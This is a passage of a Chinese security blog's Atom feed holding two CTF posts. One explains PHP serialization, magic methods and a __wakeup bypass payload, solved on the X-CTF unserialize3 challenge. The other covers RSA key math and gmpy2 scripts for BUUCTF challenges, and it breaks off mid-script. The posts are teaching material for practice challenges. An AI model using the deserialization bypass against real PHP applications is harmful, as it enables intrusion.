src="https://img-blog.csdnimg.cn/20210127180402891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（一）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="https://swhat.github.io/tags/CTFhub/"/>
    
    <category term="信息泄露" scheme="https://swhat.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>浅谈PHP反序列化漏洞</title>
    <link href="https://swhat.github.io/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://swhat.github.io/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-10-18T07:44:31.000Z</published>
    <updated>2021-02-05T05:30:15.037Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：PHP反序列化</p> <a id="more"></a><h2 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h2><blockquote><p>序列化是将变量转换为可保存或传输的字符串的过程。</p></blockquote><p>函数  <code>serialize()</code>，可将变量转换为字符串并且在转换中保存当前变量的值。<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。php允许保存一个对象方便以后重用，这个过程被称为序列化。<br>我们先建一个Test对象，存入信息，然后直接输出对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line">    print_r(<span class="variable">$m</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Test <span class="keyword">Object</span></span><br><span class="line">(</span><br><span class="line">    [id] =&gt; <span class="number">1</span></span><br><span class="line">    [name] =&gt; admin</span><br><span class="line">    [password] =&gt; admins</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>先new一个实例$m，再用<code>serialize()</code>函数将这个对象进行序列化成字符串，然后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$name</span> =<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$m</span>-&gt;id=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;name=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;password=<span class="string">&quot;roots&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$m</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化后的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;roots&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>分析一下输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205041836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>黑色箭头，字母O代表Object对象；如果是A，则代表Array数组。<br>黄色箭头，数字4，代表对象名称Test占4个字符。<br>橙色箭头，数字3，代表对象里面有3个变量。<br>红色箭头，字母s代表string类型，i代表int类型。<br>紫色箭头，数字2，代表变量名占2个字符。</p><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><blockquote><p>反序列化是在适当的时候把这个字符串再转化成原来的变量使用。</p></blockquote><p>函数<code>unserialize</code> ，把serialize序列化后的字符串变成一个对象。可以从已存储的表示中创建PHP的值。恢复原先被序列化的变量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$name</span> =<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$m</span>-&gt;id=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;name=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;password=<span class="string">&quot;roots&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$val</span> = serialize(<span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$Nm</span>=unserialize(<span class="variable">$val</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Nm</span>-&gt;name.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Nm</span>-&gt;id;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205513840.png#pic_center" alt="在这里插入图片描述"><br><a href="https://www.w3cschool.cn/tools/index?name=unserialize">php在线反序列化工具</a><br><img src="https://img-blog.csdnimg.cn/2020101221001958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h2><p>PHP面向对象变成中，有一类函数叫做魔术函数。这些函数是以<code>__</code>开头的，依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>__wakeup()</td><td>触发unserialize()方法时会被调用</td></tr><tr><td>__sleep()</td><td>触发serialize()方法时会被调用</td></tr><tr><td>__construct()</td><td>创建一个对象时会被调用</td></tr><tr><td>__destruct()</td><td>销毁一个对象时会被调用</td></tr><tr><td>__get()</td><td>调出不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__set()</td><td>修改或写入不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__toString()</td><td>类对象被当作一个字符串使用时会被调用。</td></tr><tr><td>__isset()</td><td>对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。</td></tr><tr><td>__unset（）</td><td>对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。</td></tr><tr><td>__invoke()</td><td>将实例化对象当作方法使用时会被调用。</td></tr></tbody></table><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="wakeup-和-sleep"><a href="#wakeup-和-sleep" class="headerlink" title="__wakeup()和__sleep()"></a>__wakeup()和__sleep()</h3><blockquote><p>   <strong>PHP __wakeup()函数漏洞</strong><br>   在程序执行前，serialize() 函数会首先检查是否存在一个魔术方法 __sleep。如果存在，__sleep()方法会先被调用， 然后才执行串行化（序列化）操作。<br>   这个功能可以用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个__wakeup方法。<br>   如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个wakeup()是可以被绕过的__wakeup 触发于 unserilize() 调用之前, 当反序列化时的字符串所对应的对象的数目被修改,__wake 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如__destruct。</p></blockquote><p>来一道题</p><p> <strong><em>[X-CTF]unserialize3</em></strong><br>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><p>打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。对xctf类进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化后的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>直接传参给code的结果<br><img src="https://img-blog.csdnimg.cn/20201014185510234.png#pic_center" alt="在这里插入图片描述"><br>我们要绕过<code>__wakeup</code>这个魔术函数，利用反序列化漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会绕过<code>__wakeup</code>的执行</p><p>将上面的序列化后字符串，对象属性个数由真实值1修改为2。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020101419075342.png#pic_center" alt="在这里插入图片描述"></p><h2 id="序列化参数"><a href="#序列化参数" class="headerlink" title="序列化参数"></a>序列化参数</h2><p>序列化参数有三种，分别是public、protected和private，三者在序列化时有明显的区别。</p><h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231004661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>public序列化后的参数变成 <code>test1</code></p><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><blockquote><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test1</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123231030686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;\00test\00test2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>private序列化后的参数被反序列化后变成 <code>\00test\00test2</code> </p><h3 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h3><blockquote><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201123230813337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>而在网页中运行的结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;\00*\00test3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>protected序列化后的参数变成 <code>\00*\00test3</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：PHP反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="https://swhat.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>RSA算法详解与练习</title>
    <link href="https://swhat.github.io/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/</id>
    <published>2020-10-04T07:50:38.000Z</published>
    <updated>2021-02-05T04:28:08.191Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：做题遇到的一些RSA脚本</p><a id="more"></a><h2 id="1-什么是RSA"><a href="#1-什么是RSA" class="headerlink" title="1. 什么是RSA"></a>1. 什么是RSA</h2><p>1977年，麻省理工学院的 Ron Rivest、Adi Shamir 和 Leonard Adleman 共同提出了一种非对称加密算法，用他们三人的姓氏缩写命名为 RSA。RSA 既不是惟一，也不是最早的非对称加密算法。但它是使用最广泛，因而也是最重要的非对称加密算法。</p><h2 id="2-RSA算法描述"><a href="#2-RSA算法描述" class="headerlink" title="2. RSA算法描述"></a>2. RSA算法描述</h2><h3 id="2-1-产生公私密钥对"><a href="#2-1-产生公私密钥对" class="headerlink" title="2.1 产生公私密钥对"></a>2.1 产生公私密钥对</h3><blockquote><p>1.随机选择两个不相等的质数p和q。<br>2.计算p和q的乘积n(n=p*q),n的长度就是密钥长度。<br>3.计算n的欧拉函数φ(n)： φ(n) = (p-1)(q-1)<br>4.随机选择一个整数e，也就是公钥当中用来加密的那个数字 条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。<br>5.取e的模反数d，计算方法为:e * d ≡ 1 (mod φ)<br>6.将n和e封装成公钥，n和d封装成私钥，（n，e),(n，d)就是密钥对。</p></blockquote><p>补充说明:<br>1.下面代码中使用<code>phi</code>代替欧拉函数φ(n)<br>2.如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。</p><h3 id="2-2-RSA加密"><a href="#2-2-RSA加密" class="headerlink" title="2.2 RSA加密"></a>2.2 RSA加密</h3><p> 首先对明文进行比特串分组，使得每个分组对应的十进制数小于n，然后依次对每个分组m做一次加密，所有分组的密文构成的序列就是原始消息的加密结果，即m满足0&lt;=m&lt;n，则加密算法为：<br> <code>c≡ m^e mod n</code>; c为密文，且0&lt;=c&lt;n。 （还可以表示为c = pow(m, e, N）<br> <img src="https://img-blog.csdnimg.cn/20201004174827178.png#pic_center" alt="在这里插入图片描述"></p><p>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。只要知道E和N就可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥。即<code>公钥=(E,N)</code></p><h3 id="2-3-RSA解密"><a href="#2-3-RSA解密" class="headerlink" title="2.3 RSA解密"></a>2.3 RSA解密</h3><p>对于密文0&lt;=c&lt;n，解密算法为： <code>m≡ c^d mod n</code>;（还可以表示为m = pow(c, d, N)）</p><p><img src="https://img-blog.csdnimg.cn/20201004113320969.png#pic_center" alt="在这里插入图片描述"><br>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥。即<code>私钥=(D,N)</code></p><h3 id="2-4-RSA相关值"><a href="#2-4-RSA相关值" class="headerlink" title="2.4 RSA相关值"></a>2.4 RSA相关值</h3><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>p 和 q</td><td>两个不相等的质数</td></tr><tr><td>n</td><td>大整数n，称之为模数</td></tr><tr><td>e 和 d</td><td>互为模反数的两个指数</td></tr><tr><td>c 和 m</td><td>分别是密文和明文</td></tr></tbody></table><h2 id="3-安装gmpy2"><a href="#3-安装gmpy2" class="headerlink" title="3. 安装gmpy2"></a>3. 安装gmpy2</h2><p>检查一下是否安装了wheel文件包，在cmd中输入<code>wheel</code>，查看一下<br><img src="https://img-blog.csdnimg.cn/20201004171147495.png#pic_center" alt="在这里插入图片描述"><br>如果没有安装，则输入<code>pip install wheel</code>安装<br><img src="https://img-blog.csdnimg.cn/20201004171222132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>安装好wheel后，还需要再安装gmpy2所需要的whl文件，查找需要的<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/">whl文件包</a>。注意，whl文件包需要和你所安装的python3版本一致；</p><p>输入python查看电脑Python版本所支持的whl文件版本<br><img src="https://img-blog.csdnimg.cn/2020100417135991.png#pic_center" alt="在这里插入图片描述"><br>我使用的是python3.8 32位，下载gmpy2‑2.0.8‑cp38‑cp38‑win32.whl，放到python文件目录下。<br><img src="https://img-blog.csdnimg.cn/20201004172026759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>然后再在cmd中输入：pip install （whl文件的路径）<br><img src="https://img-blog.csdnimg.cn/20201004172409410.png#pic_center" alt="在这里插入图片描述"><br>最后输入：<code>pip install gmpy2</code>就可以安装，没有报错即安装成功<br><img src="https://img-blog.csdnimg.cn/2020100417261163.png#pic_center" alt="在这里插入图片描述"></p><h2 id="4-实战练习"><a href="#4-实战练习" class="headerlink" title="4. 实战练习"></a>4. 实战练习</h2><h3 id="4-1-已知p、q、e，求d"><a href="#4-1-已知p、q、e，求d" class="headerlink" title="4.1 已知p、q、e，求d"></a>4.1 已知p、q、e，求d</h3><p><strong>[BUUCTF]RSA</strong><br><img src="https://img-blog.csdnimg.cn/20201005193350346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>运行得到<br><img src="https://img-blog.csdnimg.cn/20201005193500626.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-2-1-已知p、q、e、密文c，求明文m"><a href="#4-2-1-已知p、q、e、密文c，求明文m" class="headerlink" title="4.2.1 已知p、q、e、密文c，求明文m"></a>4.2.1 已知p、q、e、密文c，求明文m</h3><p><strong>[BUUCTF] rsarsa</strong></p><p>打开文档，给出了p、q、e的值<br><img src="https://img-blog.csdnimg.cn/20200930105157902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><em>方法一</em>：使用RSAtool工具<br>使用rsatool工具计算d的值，直接填入p,q,把e =  65537转换为16进制在再填入，再点击Calc.D,即可获得D的值。<br><img src="https://img-blog.csdnimg.cn/20200930105901703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">C = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">d = <span class="number">56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span></span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">pow</span>(C,d,n)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到明文flag<br><img src="https://img-blog.csdnimg.cn/20200930110203438.png#pic_center" alt="在这里插入图片描述"><br><em>方法二</em>：利用<code>gmpy2</code>直接写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span 